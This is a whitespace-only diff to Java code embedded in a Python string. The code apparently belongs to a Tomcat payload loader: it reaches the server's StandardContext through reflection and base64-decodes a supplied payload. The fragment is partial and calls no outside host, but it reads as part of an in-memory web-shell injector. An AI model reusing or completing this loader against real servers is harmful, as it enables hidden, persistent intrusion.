@@ -66,7 +66,7 @@ code = """
     }
 
     private Object invokeMethod(
-            Object obj, String methodName, Object... args
+        Object obj, String methodName, Object... args
     ) {
         ArrayList clazzs = new ArrayList();
         if (args != null) {
@@ -81,8 +81,8 @@ code = """
             }
         }
         Method method = getMethod(
-                obj.getClass(), methodName,
-                (Class[]) clazzs.toArray(new Class[]{})
+            obj.getClass(), methodName,
+            (Class[]) clazzs.toArray(new Class[]{})
         );
         try {
             return method.invoke(obj, args);
@@ -97,8 +97,8 @@ code = """
 
     private Object getStandardContext() {
         return invokeMethod(
-                getFieldValue(getLoader(), "resources"),
-                "getContext"
+            getFieldValue(getLoader(), "resources"),
+            "getContext"
         );
     }
 
@@ -108,14 +108,14 @@ code = """
         try {
             base64 = Class.forName("java.util.Base64");
             bytes = (byte[]) invokeMethod(
-                    getMethodX(base64, "getDecoder", 0).invoke(base64, null),
-                    "decode", payload
+                getMethodX(base64, "getDecoder", 0).invoke(base64, null),
+                "decode", payload
             );
         } catch (ClassNotFoundException e) {
             try {
                 base64 = Class.forName("sun.misc.BASE64Decoder");
                 bytes = (byte[]) invokeMethod(
-                        base64.newInstance(), "decodeBuffer", payload
+                    base64.newInstance(), "decodeBuffer", payload
                 );
             } catch (Exception ex) {}
         } catch (Exception ex) {}
